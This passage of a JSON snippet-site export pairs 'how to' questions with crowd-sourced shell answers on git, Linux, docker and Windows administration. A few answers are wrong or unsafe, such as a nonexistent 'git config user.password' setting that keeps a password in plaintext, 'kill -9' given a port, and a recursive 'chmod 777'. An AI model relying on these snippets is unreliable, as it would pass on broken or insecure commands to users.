    "description": "git config --global user.email \"you@example.com\" git config --global user.name \"Your Name\" git config --global user.password \"your password\"\n",
    "reg_date": "2021-10-11T22:06:12.000Z"
  },
  {
    "id": 2169,
    "keyword": null,
    "link": null,
    "title": " how to change fedora clock to 12 hour",
    "description": "Go to Applications > System Tools > System Settings and click Date and Time icon.  Select the Time Format drop down box and select AM/PM\n",
    "reg_date": "2021-10-11T22:06:12.000Z"
  },
  {
    "id": 2170,
    "keyword": null,
    "link": null,
    "title": " how to change git remote origin",
    "description": "git remote set-url origin new.git.url/here\ngit remote set-url origin https://hostname/USERNAME/REPOSITORY.git\n# Overwriting an existing git url: git remote set-url origin <git_url>\ngit remote set-url origin git@your.git.repo.example.com:user/repository2.git\ngit remote set-url origin git@accountname.git.beanstalkapp.com:/your-repository.git\n$ git remote -v > origin  https://github.com/USERNAME/REPOSITORY.git (fetch) > origin  https://github.com/USERNAME/REPOSITORY.git (push)  Change your remote\\'s URL from HTTPS to SSH with the git remote set-url command. $ git remote set-url origin git@github.com:USERNAME/REPOSITORY.git  Verify that the remote URL has changed. $ git remote -v # Verify new remote URL > origin  git@github.com:USERNAME/REPOSITORY.git (fetch) > origin  git@github.com:USERNAME/REPOSITORY.git (push)\n",
    "reg_date": "2021-10-11T22:06:13.000Z"
  },
  {
    "id": 2171,
    "keyword": null,
    "link": null,
    "title": " how to change gopath",
    "description": "export GOPATH=$HOME/go export PATH=$PATH:$GOROOT/bin:$GOPATH/bin \n",
    "reg_date": "2021-10-11T22:06:13.000Z"
  },
  {
    "id": 2172,
    "keyword": null,
    "link": null,
    "title": " how to change hostname in ubuntu",
    "description": "#1- Delete the old name and setup new name sudo hostnamectl set-hostname newHostname  #2- Edit the /etc/hosts file: sudo nano /etc/hosts  #3- Reboot the system  sudo reboot  #4- To check the new hostname hostnamectl\nsudo nano /etc/hostname sudo nano /etc/hosts sudo reboot\n# -l changes login name # -d changes home directory # -m copies over contents from old home directory usermod -l <newname> -d /home/<newname> -m <oldname>  # NOTE: will not work if you are currently logged on as user # - workaround by temporarily enabling root account and running above command there # [sudo passwd root]  # - after root account has been used to change username lock it using # [sudo passwd -l root]\nType the following commands: $ sudo hostname new-server-name-here\n",
    "reg_date": "2021-10-11T22:06:13.000Z"
  },
  {
    "id": 2173,
    "keyword": null,
    "link": null,
    "title": " how to change java version in linux",
    "description": "$ sudo update-alternatives --config java\nsudo update-alternatives --config java\nsudo update-java-alternatives -s java-8-oracle export JAVA_HOME=/usr/lib/jvm/java-8-oracle/ export PATH=$PATH:$JAVA_HOME 123\n",
    "reg_date": "2021-10-11T22:06:13.000Z"
  },
  {
    "id": 2174,
    "keyword": null,
    "link": null,
    "title": " how to change my git default editor to vs code",
    "description": "git config --global core.editor \"code --wait\"\ngit config --global core.editor code\n",
    "reg_date": "2021-10-11T22:06:13.000Z"
  },
  {
    "id": 2175,
    "keyword": null,
    "link": null,
    "title": " how to change permissions for the whole folder in ubuntu",
    "description": "sudo chmod -R 777 /var/DirectoryName\nsudo chmod -R 777 DirectoryName\n",
    "reg_date": "2021-10-11T22:06:13.000Z"
  },
  {
    "id": 2176,
    "keyword": null,
    "link": null,
    "title": " how to change the icon of a python exe file",
    "description": "when building python file: Note: file must be of type .ico pyinstaller hello.py --icon=icon.ico\n",
    "reg_date": "2021-10-11T22:06:13.000Z"
  },
  {
    "id": 2177,
    "keyword": null,
    "link": null,
    "title": " how to change time zone in ubuntu 18.04 server",
    "description": "sudo timedatectl set-timezone your_time_zone\n$ sudo timedatectl set-timezone Europe/Bratislava \ntimedatectl list-timezones\n$ timedatectl list-timezones | grep -i europe Europe/Amsterdam Europe/Andorra Europe/Astrakhan Europe/Athens Europe/Belgrade Europe/Berlin Europe/Bratislava Europe/Brussels Europe/Bucharest Europe/Budapest Europe/Busingen ... Europe/Zurich \n",
    "reg_date": "2021-10-11T22:06:14.000Z"
  },
  {
    "id": 2178,
    "keyword": null,
    "link": null,
    "title": " how to change timezone in linux",
    "description": "# To view timezone timedatectl  # list all available timezones timedatectl list-timezones  # update timezone sudo timedatectl set-timezone your_time_zone \nsudo timedatectl set-timezone <your_time_zone>\nsudo timedatectl set-timezone America/New_York\n",
    "reg_date": "2021-10-11T22:06:14.000Z"
  },
  {
    "id": 2179,
    "keyword": null,
    "link": null,
    "title": " how to change timezone in ubuntu",
    "description": "$ sudo dpkg-reconfigure tzdata\nsudo timedatectl set-timezone Europe/RomeCopy\n",
    "reg_date": "2021-10-11T22:06:14.000Z"
  },
  {
    "id": 2180,
    "keyword": null,
    "link": null,
    "title": " how to change username and password in git",
    "description": "# change the whole things in one go git config --global credential.helper cache # to enable credentail helper git config --global --edit\n",
    "reg_date": "2021-10-11T22:06:14.000Z"
  },
  {
    "id": 2181,
    "keyword": null,
    "link": null,
    "title": " how to check all origins of a git",
    "description": "git remote -v base    /home/***/htdocs/base (fetch) base    /home/***/htdocs/base (push) origin  git@bitbucket.org:*** (fetch) origin  git@bitbucket.org:*** (push) \n",
    "reg_date": "2021-10-11T22:06:14.000Z"
  },
  {
    "id": 2182,
    "keyword": null,
    "link": null,
    "title": " how to check cron is running or not",
    "description": "$ systemctl status cron              # checks if cron is running  $ sudo systemctl enable cron.service # enable cron to run on boot $ sudo systemctl start cron.service  # start cron now  $ sudo crontab -l                    # show all currently running cron jobs  $ sudo crontab -u panda -l           # show all cron jobs running for user panda\n",
    "reg_date": "2021-10-11T22:06:14.000Z"
  },
  {
    "id": 2183,
    "keyword": null,
    "link": null,
    "title": " how to check current installed apps in breww",
    "description": "brew list\n",
    "reg_date": "2021-10-11T22:06:14.000Z"
  },
  {
    "id": 2184,
    "keyword": null,
    "link": null,
    "title": " how to check eigen version",
    "description": "pkg-config --modversion eigen3\n",
    "reg_date": "2021-10-11T22:06:14.000Z"
  },
  {
    "id": 2185,
    "keyword": null,
    "link": null,
    "title": " how to check expo cli version",
    "description": "npm install -g expo-cli \nnpm  install -g expo-cli npx expo-cli init projectName  cd projectName npm run ios npm run android   \nnpm cache clear -f npm install -g expo-cli\nexpo login\n",
    "reg_date": "2021-10-11T22:06:14.000Z"
  },
  {
    "id": 2186,
    "keyword": null,
    "link": null,
    "title": " how to check folder size in linux",
    "description": "# show all folder size in the current directory du -h --max-depth=1\ndu -sh /home/user/\ndu -sh /var\ndf -sh .\ndu -lh --max-depth=1 --block-size=M | sort -nr\ndu -sh /home/george 2.1G    /home/george \n",
    "reg_date": "2021-10-11T22:06:15.000Z"
  },
  {
    "id": 2187,
    "keyword": null,
    "link": null,
    "title": " how to check for angular cli version",
    "description": "ng --version \n",
    "reg_date": "2021-10-11T22:06:15.000Z"
  },
  {
    "id": 2188,
    "keyword": null,
    "link": null,
    "title": " how to check git changes before commit",
    "description": "git diff --staged \ngit diff [filename] \n",
    "reg_date": "2021-10-11T22:06:15.000Z"
  },
  {
    "id": 2189,
    "keyword": null,
    "link": null,
    "title": " how to check git repository link",
    "description": "git config --get remote.origin.url\n",
    "reg_date": "2021-10-11T22:06:15.000Z"
  },
  {
    "id": 2190,
    "keyword": null,
    "link": null,
    "title": " how to check how many files are in a folder linux",
    "description": "$ ls | wc -l\nls -1q log* | wc -l\n",
    "reg_date": "2021-10-11T22:06:15.000Z"
  },
  {
    "id": 2191,
    "keyword": null,
    "link": null,
    "title": " how to check if a commit is in a branch",
    "description": "// This command gets all the branches that contain the specific commit id git branch --contains $COMMIT_ID\ngit branch --contains $COMMIT_ID\n",
    "reg_date": "2021-10-11T22:06:15.000Z"
  },
  {
    "id": 2192,
    "keyword": null,
    "link": null,
    "title": " how to check if a python script is running",
    "description": "# using Ubuntu ps -aux | grep \"python\"  # will give you the list of python process running\n",
    "reg_date": "2021-10-11T22:06:15.000Z"
  },
  {
    "id": 2193,
    "keyword": null,
    "link": null,
    "title": " how to check if am using wayland",
    "description": "echo $XDG_SESSION_TYPE\n",
    "reg_date": "2021-10-11T22:06:16.000Z"
  },
  {
    "id": 2194,
    "keyword": null,
    "link": null,
    "title": " how to check if django is installed in ubuntu",
    "description": "$ django-admin.py version\n>>> import django >>> django.VERSION (2, 0, 0, 'final', 0)\n",
    "reg_date": "2021-10-11T22:06:16.000Z"
  },
  {
    "id": 2195,
    "keyword": null,
    "link": null,
    "title": " how to check if ip is up bash script",
    "description": "#!/bin/bash IP='192.168.1.1' fping -c1 -t300 $IP 2>/dev/null 1>/dev/null if [ \"$?\" = 0 ] then   echo \"Host found\" else   echo \"Host not found\" fi\n",
    "reg_date": "2021-10-11T22:06:16.000Z"
  },
  {
    "id": 2196,
    "keyword": null,
    "link": null,
    "title": " how to check if mysql is installed ubuntu",
    "description": "#Type mysql --version #to see if it is installed.\n",
    "reg_date": "2021-10-11T22:06:16.000Z"
  },
  {
    "id": 2197,
    "keyword": null,
    "link": null,
    "title": " how to check if ubuntu is 32 or 64 bit",
    "description": "# Type The following command in the terminal  # and Read the Architecture and CPU op-mode(s) lscpu\n",
    "reg_date": "2021-10-11T22:06:16.000Z"
  },
  {
    "id": 2198,
    "keyword": null,
    "link": null,
    "title": " how to check in which brach we are in git",
    "description": "git branch -a # it will show an astrick * like *master git branch --show-current # source == git remote --help\n",
    "reg_date": "2021-10-11T22:06:16.000Z"
  },
  {
    "id": 2199,
    "keyword": null,
    "link": null,
    "title": " how to check installed apps in ubuntu",
    "description": "apt list --installed\napt list --installed | grep program_name\n",
    "reg_date": "2021-10-11T22:06:17.000Z"
  },
  {
    "id": 2200,
    "keyword": null,
    "link": null,
    "title": " how to check installed packages in linux command",
    "description": "apt list --installed | grep program_name\ndpkg-query --list | grep -i nano ii  nano    2.9.3-2    amd64    small, friendly text editor inspired by Pico\n",
    "reg_date": "2021-10-11T22:06:17.000Z"
  },
  {
    "id": 2201,
    "keyword": null,
    "link": null,
    "title": " how to check kernel version in linux",
    "description": "cat /proc/version\nuname -r\nuname -r\n$ cat /proc/version\n",
    "reg_date": "2021-10-11T22:06:17.000Z"
  },
  {
    "id": 2202,
    "keyword": null,
    "link": null,
    "title": " how to check laptop serial number in ubuntu",
    "description": "sudo dmidecode -t system | grep Serial \n",
    "reg_date": "2021-10-11T22:06:17.000Z"
  },
  {
    "id": 2203,
    "keyword": null,
    "link": null,
    "title": " how to check linux os",
    "description": "cat /etc/os-release or hostnamectl\n",
    "reg_date": "2021-10-11T22:06:18.000Z"
  },
  {
    "id": 2204,
    "keyword": null,
    "link": null,
    "title": " how to check machine is 32bit or 64bit linux",
    "description": "uname -m   NOTE: It shows if your system is running 32-bit (i686 or i386) or 64-bit(x86_64). Example 1: prashad@ubuntu:~/Desktop$ uname -m x86_64     <<<<<<<<<<<<<<this is 64-bit  Example 2:(you can check with 'lscpu' command also) durga@ubuntu:~/Desktop$$ lscpu Architecture:          i686\t  <<<<<<<<<this is 32-bit CPU op-mode(s):        32-bit  \n",
    "reg_date": "2021-10-11T22:06:18.000Z"
  },
  {
    "id": 2205,
    "keyword": null,
    "link": null,
    "title": " how to check mongodb status in ubuntu",
    "description": "sudo systemctl status mongodb\n",
    "reg_date": "2021-10-11T22:06:18.000Z"
  },
  {
    "id": 2206,
    "keyword": null,
    "link": null,
    "title": " how to check nginx version in ubuntu",
    "description": "nginx -v\n",
    "reg_date": "2021-10-11T22:06:18.000Z"
  },
  {
    "id": 2207,
    "keyword": null,
    "link": null,
    "title": " how to check ram from cli",
    "description": "free -m\n",
    "reg_date": "2021-10-11T22:06:18.000Z"
  },
  {
    "id": 2208,
    "keyword": null,
    "link": null,
    "title": " how to check running services in linux",
    "description": "service --status-all service --status-all | more service --status-all | grep ntpd service --status-all | less\n# For CentOS 7 systemctl systemctl | more systemctl | grep httpd systemctl list-units --type service systemctl list-units --type mount\n$ pstree | head -n 5\n$ sudo service httpd status httpd is stopped\n",
    "reg_date": "2021-10-11T22:06:18.000Z"
  },
  {
    "id": 2209,
    "keyword": null,
    "link": null,
    "title": " how to check spark version",
    "description": "spark-submit --version\n",
    "reg_date": "2021-10-11T22:06:18.000Z"
  },
  {
    "id": 2210,
    "keyword": null,
    "link": null,
    "title": " how to check the current git user",
    "description": "To know the username, type:  git config user.name  To know the email, type:  git config user.email\n",
    "reg_date": "2021-10-11T22:06:19.000Z"
  },
  {
    "id": 2211,
    "keyword": null,
    "link": null,
    "title": " how to check the repository name in git",
    "description": "git config --get remote.origin.url \n",
    "reg_date": "2021-10-11T22:06:19.000Z"
  },
  {
    "id": 2212,
    "keyword": null,
    "link": null,
    "title": " how to check version of linux command line",
    "description": "cat /etc/os-release\n",
    "reg_date": "2021-10-11T22:06:19.000Z"
  },
  {
    "id": 2213,
    "keyword": null,
    "link": null,
    "title": " how to check what version of cmake installed",
    "description": "cmake --version\n",
    "reg_date": "2021-10-11T22:06:19.000Z"
  },
  {
    "id": 2214,
    "keyword": null,
    "link": null,
    "title": " how to check which packages homebrew has installed",
    "description": "brew list\n",
    "reg_date": "2021-10-11T22:06:19.000Z"
  },
  {
    "id": 2215,
    "keyword": null,
    "link": null,
    "title": " how to check which process is using more memory in linux",
    "description": "ps aux --sort=-%mem | head \n",
    "reg_date": "2021-10-11T22:06:19.000Z"
  },
  {
    "id": 2216,
    "keyword": null,
    "link": null,
    "title": " how to check windows powershell version",
    "description": "PS C:\\> $PSVersionTable.PSVersion\n",
    "reg_date": "2021-10-11T22:06:20.000Z"
  },
  {
    "id": 2217,
    "keyword": null,
    "link": null,
    "title": " how to check yarn version",
    "description": "yarn --version\nyarn policies set-version 1.13.0\n",
    "reg_date": "2021-10-11T22:06:20.000Z"
  },
  {
    "id": 2218,
    "keyword": null,
    "link": null,
    "title": " how to clean cache in npn",
    "description": "npm cache clean --force\n",
    "reg_date": "2021-10-11T22:06:20.000Z"
  },
  {
    "id": 2219,
    "keyword": null,
    "link": null,
    "title": " how to clear all the caches in ubuntu",
    "description": "$ sudo apt-get clean\nsudo apt-get clean \n",
    "reg_date": "2021-10-11T22:06:20.000Z"
  },
  {
    "id": 2220,
    "keyword": null,
    "link": null,
    "title": " how to clear git status",
    "description": "$ git rm -r --cached .\ngit rm -r --cached .\n",
    "reg_date": "2021-10-11T22:06:20.000Z"
  },
  {
    "id": 2221,
    "keyword": null,
    "link": null,
    "title": " how to clone from heroku",
    "description": "$ heroku git:clone -a myapp \n",
    "reg_date": "2021-10-11T22:06:20.000Z"
  },
  {
    "id": 2222,
    "keyword": null,
    "link": null,
    "title": " how to clone my linux so all the installed packages",
    "description": "sudo apt-get install apt-clone apt-clone clone foo  Copy foo.apt-clone.tar.gz to the new machine and run  sudo apt-get install apt-clone sudo apt-clone restore foo.apt-clone.tar.gz   apt-clone may work between related distributions,  e.g. Debian and Ubuntu. Use restore-new-distro instead of restore in that case.  If that fails, use the manual method with dpkg --get-selections and apt-mark,  and fiddle with the package list until apt is satisfied.\n",
    "reg_date": "2021-10-11T22:06:21.000Z"
  },
  {
    "id": 2223,
    "keyword": null,
    "link": null,
    "title": " how to close a port mac",
    "description": "sudo lsof -i :5955 \nsudo lsof -i :<port>\nkill -9 port\n",
    "reg_date": "2021-10-11T22:06:21.000Z"
  },
  {
    "id": 2224,
    "keyword": null,
    "link": null,
    "title": " how to close port 3000 running",
    "description": "### For Linux/Mac OS search (sudo) run this in the terminal: $ lsof -i tcp:3000 $ kill -9 PID  ### On Windows: netstat -ano | findstr :3000 tskill typeyourPIDhere   ### change tskill for taskkill in git bash\nnetstat -ano | findstr :3000 taskkill /PID \"123\" /F \nnetstat -ano | findstr :3000 taskkill /F /PID PID_of_port\n",
    "reg_date": "2021-10-11T22:06:21.000Z"
  },
  {
    "id": 2225,
    "keyword": null,
    "link": null,
    "title": " how to close serveice on perticular port number",
    "description": "# It  gives PID of the service netstat -ano | findstr :<Port>  # Kill the process using PID taskkill /PID <PID> /F\n",
    "reg_date": "2021-10-11T22:06:21.000Z"
  },
  {
    "id": 2226,
    "keyword": null,
    "link": null,
    "title": " how to close sockets ubuntu",
    "description": "sudo netstat -ap | grep :<port_number>     #The second line will contain the process id. e.g: 7838/python3 (7838 is the pid) kill <pid>\n",
    "reg_date": "2021-10-11T22:06:21.000Z"
  },
  {
    "id": 2227,
    "keyword": null,
    "link": null,
    "title": " how to commit code to bitbucket first time",
    "description": "git init git add --all git commit -m \"Initial Commit\" git remote add origin <the URL for your Bitbucket repository>  git push -u origin master\n",
    "reg_date": "2021-10-11T22:06:21.000Z"
  },
  {
    "id": 2228,
    "keyword": null,
    "link": null,
    "title": " how to compare float values in shell script",
    "description": "# comparing floting points compare=`echo | awk \"{ print ($x < $y)?1 : 0 }\"` echo compare=$compare  if [[ $compare -eq 1 ]]; then \techo x=$x is less than y=$y elif [[ $compare -eq 0 ]]; then \techo y=$y is less than x=$x fi\n",
    "reg_date": "2021-10-11T22:06:21.000Z"
  },
  {
    "id": 2229,
    "keyword": null,
    "link": null,
    "title": " how to completely remove apps ubuntu package",
    "description": "$ sudo apt-get remove package-name\n$ sudo apt-get purge package-name\n$ sudo apt-get autoremove\n",
    "reg_date": "2021-10-11T22:06:22.000Z"
  },
  {
    "id": 2230,
    "keyword": null,
    "link": null,
    "title": " how to completely uninstall android studio mac",
    "description": "rm -Rf /Applications/Android\\ Studio.app   rm -Rf ~/Library/Preferences/AndroidStudio*   rm -Rf ~/Library/Preferences/com.google.android.*   rm -Rf ~/Library/Preferences/com.android.*   rm -Rf ~/Library/Application\\ Support/AndroidStudio*   rm -Rf ~/Library/Logs/AndroidStudio*   rm -Rf ~/Library/Caches/AndroidStudio*   rm -Rf ~/.AndroidStudio*   rm -Rf ~/.gradle   rm -Rf ~/.android   rm -Rf ~/Library/Android*   rm -Rf /usr/local/var/lib/android-sdk/   \nrm -Rf /Applications/Android\\ Studio.app rm -Rf ~/Library/Preferences/AndroidStudio* rm -Rf ~/Library/Preferences/com.google.android.* rm -Rf ~/Library/Preferences/com.android.* rm -Rf ~/Library/Application\\ Support/AndroidStudio* rm -Rf ~/Library/Logs/AndroidStudio* rm -Rf ~/Library/Caches/AndroidStudio* rm -Rf ~/.AndroidStudio* \n",
    "reg_date": "2021-10-11T22:06:22.000Z"
  },
  {
    "id": 2231,
    "keyword": null,
    "link": null,
    "title": " how to configure bluetooth on ubuntu command line",
    "description": "'If you are on Ubuntu or an Ubuntu-based distro, run the following: command: '     sudo apt-get install bluetooth bluez bluez-tools rfkill.     sudo rfkill list.     sudo rfkill unblock bluetooth.     sudo service bluetooth start.     sudo apt-get install blueman.\n#If you are on Ubuntu or an Ubuntu-based distro, run the following: command:      sudo apt-get install bluetooth bluez bluez-tools rfkill.     sudo rfkill list.     sudo rfkill unblock bluetooth.     sudo service bluetooth start.     sudo apt-get install blueman.\n",
    "reg_date": "2021-10-11T22:06:22.000Z"
  },
  {
    "id": 2232,
    "keyword": null,
    "link": null,
    "title": " how to connect remote repo with local repo",
    "description": "git remote add origin <remote_repo_url> git push --all origin  If you want to set all of your branches to  automatically use this remote repo when you use git pull, add --set-upstream to the push:  git push --all --set-upstream origin\n",
    "reg_date": "2021-10-11T22:06:22.000Z"
  },
  {
    "id": 2233,
    "keyword": null,
    "link": null,
    "title": " how to convert .qrc file in python",
    "description": "# Locate .qrc file and run this command into terminal it will generate .py file. # Now import icon_rc file >> pyrcc5 icons.qrc -o icon_rc.py\n",
    "reg_date": "2021-10-11T22:06:23.000Z"
  },
  {
    "id": 2234,
    "keyword": null,
    "link": null,
    "title": " how to convert openssl to keytool",
    "description": "openssl pkcs12 -export -in example.crt -inkey example.key -out keystore.pkcs12 \nopenssl pkcs12 -export -in webgui.crt -inkey webgui.key -name {{ webgui.server_ssl_key_alias }} -out webgui.p12 -password pass:{{ webgui.server_ssl_key_store_password }}\n",
    "reg_date": "2021-10-11T22:06:23.000Z"
  },
  {
    "id": 2235,
    "keyword": null,
    "link": null,
    "title": " how to convert ppk to pem in linux",
    "description": "1.install putty-tools with the following command: \tsudo apt-get install putty-tools 2.Now convert your .ppk file to .pem using the following command: \tputtygen yourkey.ppk -O private-openssh -o yourkey.pem 3.Set the proper permission to use the .pem file with following command: \tchmod 400 yourkey.pem 4.Connect to you server using the following command \tssh -i yourkey.pem serverusername@server-ip\n",
    "reg_date": "2021-10-11T22:06:23.000Z"
  },
  {
    "id": 2236,
    "keyword": null,
    "link": null,
    "title": " how to convert ui to py pyqt5",
    "description": "# To convert .ui file to .py using pyqt5 module >> pyuic5 -x main.ui -o main.py # pyQt5 version >> pyuic4 -x main.ui -o main.py # pyQt4 version\n# To convert pyqt5 file(.ui) to python file(.py) >> pyuic5 -x file.ui -o file.py\npyside6-uic UIFILENAME.ui > PYHTON_FILENAME.py\n",
    "reg_date": "2021-10-11T22:06:23.000Z"
  },
  {
    "id": 2237,
    "keyword": null,
    "link": null,
    "title": " how to copy ssh key",
    "description": "clip < ~/.ssh/id_rsa.pub\nssh-copy-id -i ~/.ssh/mykey user@host\n$  cat ~/.ssh/id_rsa \n",
    "reg_date": "2021-10-11T22:06:23.000Z"
  },
  {
    "id": 2238,
    "keyword": null,
    "link": null,
    "title": " how to count all files in a directory linux recursively",
    "description": "find DIR_NAME -type f | wc -l\n",
    "reg_date": "2021-10-11T22:06:23.000Z"
  },
  {
    "id": 2239,
    "keyword": null,
    "link": null,
    "title": " how to create a desktop shortcut for windows store programs",
    "description": "Press the Win + R keys together on your keyboard to open the Run dialog  and type shell:AppsFolder in the run box. Hit the Enter key to open the  Applications folder. Now, drag and drop the shortcut of the desired app to the  Desktop. Windows will create a new shortcut for it instantly!\n",
    "reg_date": "2021-10-11T22:06:23.000Z"
  },
  {
    "id": 2240,
    "keyword": null,
    "link": null,
    "title": " how to create a guid in powershell",
    "description": "New-Guid\n",
    "reg_date": "2021-10-11T22:06:24.000Z"
  },
  {
    "id": 2241,
    "keyword": null,
    "link": null,
    "title": " how to create a junction between folders",
    "description": "mklink /J <Path to of new link> <Path To the Folder where it would link to>  #(make sure that there isn't a folder already #with the same name of the link folder)\n",
    "reg_date": "2021-10-11T22:06:24.000Z"
  },
  {
    "id": 2242,
    "keyword": null,
    "link": null,
    "title": " how to create a vm in anaconda",
    "description": "conda create -n yourenvname python=x.x anaconda\n",
    "reg_date": "2021-10-11T22:06:24.000Z"
  },
  {
    "id": 2243,
    "keyword": null,
    "link": null,
    "title": " how to create branch in github using git bash",
    "description": "$ git checkout -b [name_of_your_new_branch]\n$ git push origin :[name_of_your_new_branch]\n",
    "reg_date": "2021-10-11T22:06:24.000Z"
  },
  {
    "id": 2244,
    "keyword": null,
    "link": null,
    "title": " how to create flutter project in terminal",
    "description": "$ flutter create myapp \ncommand to create new flutter project\n",
    "reg_date": "2021-10-11T22:06:24.000Z"
  },
  {
    "id": 2245,
    "keyword": null,
    "link": null,
    "title": " how to create tag in git",
    "description": "git tag -a v1.4 -m \"my version 1.4\" \ngit tag -a v1.4 -m \"my version 1.4\"\n",
    "reg_date": "2021-10-11T22:06:24.000Z"
  },
  {
    "id": 2246,
    "keyword": null,
    "link": null,
    "title": " how to decompress gzip file in linux",
    "description": "gunzip -k file.gz \n",
    "reg_date": "2021-10-11T22:06:24.000Z"
  },
  {
    "id": 2247,
    "keyword": null,
    "link": null,
    "title": " how to delete a file using powershell",
    "description": "Remove-Item \"path/filename.extension\"\n",
    "reg_date": "2021-10-11T22:06:24.000Z"
  },
  {
    "id": 2248,
    "keyword": null,
    "link": null,
    "title": " how to delete a folder from the terminal ubuntu",
    "description": "rm -r archivosmixed\n",
    "reg_date": "2021-10-11T22:06:25.000Z"
  },
  {
    "id": 2249,
    "keyword": null,
    "link": null,
    "title": " how to delete a package in ubuntu",
    "description": "sudo apt-get --purge remove [package]\nsudo apt remove <package name>\nsudo apt-get remove pkg\n",
    "reg_date": "2021-10-11T22:06:25.000Z"
  },
  {
    "id": 2250,
    "keyword": null,
    "link": null,
    "title": " how to delete all branches except master",
    "description": "$ git branch | grep -v \"master\" | xargs git branch -D \ngit branch | grep -v \"master\" | grep -v ^* | xargs git branch -D\n",
    "reg_date": "2021-10-11T22:06:25.000Z"
  },
  {
    "id": 2251,
    "keyword": null,
    "link": null,
    "title": " how to delete dangling docker images",
    "description": "sudo docker rmi $(sudo docker images -f \"dangling=true\" -q) \ndocker image prune\nsudo sh -c 'docker rmi $(docker images -f \"dangling=true\" -q)' \n",
    "reg_date": "2021-10-11T22:06:25.000Z"
  },
  {
    "id": 2252,
    "keyword": null,
    "link": null,
    "title": " how to delete deployments in kubernetes",
    "description": "kubectl delete deployment yourDeploymentName\n$ kubectl delete deploy/<deployment_name>\n",
    "reg_date": "2021-10-11T22:06:25.000Z"
  },
  {
    "id": 2253,
    "keyword": null,
    "link": null,
    "title": " how to delete docker containers",
    "description": "docker rm $(docker ps -a -q)\ndocker container rm $(docker container ls &ndash;aq) docker container stop $(docker container ls &ndash;aq) && docker system prune &ndash;af &ndash;&ndash;volumes\ndocker system prune -a \ndocker rmi $(docker images -q)\ndocker system prune\n",
    "reg_date": "2021-10-11T22:06:26.000Z"
  },
  {
    "id": 2254,
    "keyword": null,
    "link": null,
    "title": " how to delete docker images older than x days from docker hub using a shell script serverfault",
    "description": "#!/bin/bash #Script will delete all images in all repositories of your docker hub account which are older than 'X' days set -e  # set your username, password and no. of 'X' days value in below lines. #UNAME=\"YOUR_USERNAME\" #UPASS=\"YOUR_PASSWORD\" #X=\"YOUR_DAYS_VALUE\"  # pass username,password and no of 'X' days value from terminal as below line. # ./docker-images-remove-script.sh <username> <password> <30> UNAME=$1 UPASS=$2 X=$3  # get token to be able to talk to Docker Hub TOKEN=$(curl -s -H \"Content-Type: application/json\" -X POST -d '{\"username\": \"'${UNAME}'\", \"password\": \"'${UPASS}'\"}' https://hub.docker.com/v2/users/login/ | jq -r .token)   #echo $TOKEN echo # get list of repos for that user account echo \"List of Repositories in '${UNAME}' Docker Hub account.\" sleep 5 REPO_LIST=$(curl -s -H \"Authorization: JWT ${TOKEN}\" \"https://hub.docker.com/v2/repositories/${UNAME}/?page_size=10000\" | jq -r '.results|.[]|.name') #echo \"$REPO_LIST\" count=1 for rep in ${REPO_LIST} do      echo S.No: $count RepoName:  $rep      count=`expr $count + 1` done echo sleep 5    echo echo \"Identifying and deleting images which are older than $X days in '${UNAME}' docker hub account.\" sleep 5  #NOTE!!! For deleting specific repositories images please include only those repositories in for-loop, like below for-loop which has repos mysql and mymongo  #for i in  mysql mymongo  for rep in ${REPO_LIST}    do     # get total no. of images & their count for a repo     Images=$(curl -s -H \"Authorization: JWT ${TOKEN}\" \"https://hub.docker.com/v2/repositories/$UNAME/$rep/tags/\")     ImageCount=$(echo $Images | jq -r '.count')         echo \"Total no of Images in '$UNAME/$rep' repository are: $ImageCount\"     pages=`expr $ImageCount / 100 + 1`     echo \"No pages to iterate are: $pages\"         sleep 5     for (( p=1; p<=$pages; p++ ))     do                  echo \"Looping Through '$rep' repository in '${UNAME}' account.\"         IMAGES=$(curl -s -H \"Authorization: JWT ${TOKEN}\" \"https://hub.docker.com/v2/repositories/${UNAME}/${rep}/tags/?page_size=100&page=$p\")          IMAGE_TAGS=$(echo $IMAGES | jq -r '.results|.[]|.name')         count1=1               # build a list of images from tags              for tag in ${IMAGE_TAGS}              do                                      echo Iteration no. is: $p                   echo \"S.No: $count1. RepoName: '$rep' ImageTag: $tag\"                   count1=`expr $count1 + 1`                   sleep 5                   # Get last_updated_time                   updated_time=$(curl -s -H \"Authorization: JWT ${TOKEN}\" https://hub.docker.com/v2/repositories/${UNAME}/${rep}/tags/${tag}/?page_size=100 | jq -r '.last_updated')                   echo \"Image build date and time is : $updated_time\"                   datetime=$updated_time                   timeago=''$X' days ago'                   #echo $timeago                    dtSec=$(date --date \"$datetime\" +\"%Y%m%d\")                   taSec=$(date --date \"$timeago\"  +\"%Y%m%d\")                                       dt_Sec=$(date --date \"$datetime\" +\"%Y-%m-%d\")                   ta_Sec=$(date --date \"$timeago\"  +\"%Y-%m-%d\")                                       echo \"INFO: Date on which this image was build: $dt_Sec\"                    echo \"INFO: $X days earlier date from today is: $ta_Sec\"                    sleep 5                   if [ $dtSec -lt $taSec ]                    then                         echo \"This image '${UNAME}/${rep}:${tag}'  is older than $X days, deleting this  image.\"                   #### Note! TO delete an image please uncomment below line.                   #### curl -s  -X DELETE  -H \"Authorization: JWT ${TOKEN}\" https://hub.docker.com/v2/repositories/${UNAME}/${rep}/tags/${tag}/                   else                         echo \"This image '${UNAME}/${rep}:${tag}' is within $X days time range, keep this image.\"                   fi              done           done echo done  echo \"Script execution ends here.\" \n #!/bin/bash  set -e  # set username and password UNAME=\"YOUR_USERNAME\" UPASS=\"YOUR_PASSWORD\"  # get token to be able to talk to Docker Hub TOKEN=$(curl -s -H \"Content-Type: application/json\" -X POST -d '{\"username\": \"'${UNAME}'\", \"password\": \"'${UPASS}'\"}' https://hub.docker.com/v2/users/login/ | jq -r .token)  # get list of namespaces accessible by user (not in use right now) #NAMESPACES=$(curl -s -H \"Authorization: JWT ${TOKEN}\" https://hub.docker.com/v2/repositories/namespaces/ | jq -r '.namespaces|.[]')  #echo $TOKEN echo # get list of repos for that user account echo \"List of Repositories in ${UNAME} Docker Hub account\" sleep 5 REPO_LIST=$(curl -s -H \"Authorization: JWT ${TOKEN}\" https://hub.docker.com/v2/repositories/${UNAME}/?page_size=10000 | jq -r '.results|.[]|.name') echo $REPO_LIST echo # build a list of all images & tags for i in ${REPO_LIST} do   # get tags for repo   IMAGE_TAGS=$(curl -s -H \"Authorization: JWT ${TOKEN}\" https://hub.docker.com/v2/repositories/${UNAME}/${i}/tags/?page_size=10000 | jq -r '.results|.[]|.name')    # build a list of images from tags   for j in ${IMAGE_TAGS}   do     # add each tag to list     FULL_IMAGE_LIST=\"${FULL_IMAGE_LIST} ${UNAME}/${i}:${j}\"          done done  # output list of all docker images echo echo \"List of all docker images in ${UNAME} Docker Hub 